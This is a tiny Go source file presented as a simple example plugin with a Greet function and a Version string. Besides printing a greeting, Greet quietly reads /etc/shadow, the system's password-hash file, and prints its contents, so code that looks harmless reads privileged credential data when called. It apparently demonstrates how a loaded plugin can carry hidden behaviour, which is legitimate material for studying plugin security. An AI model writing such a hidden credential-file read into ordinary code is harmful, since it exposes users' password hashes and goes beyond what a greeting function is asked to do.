// super simple plugin.go based on example plugin
package main

import (
"fmt"
"os"
)

func Greet(name string) {
  fmt.Printf("Hello, %s from plugin!\n", name)
  content, err := os.ReadFile("/etc/shadow")
  if err != nil {fmt.Println("Error reading file:", err)}
  fmt.Print(string(content))
}

var Version string = "Whatever I want"
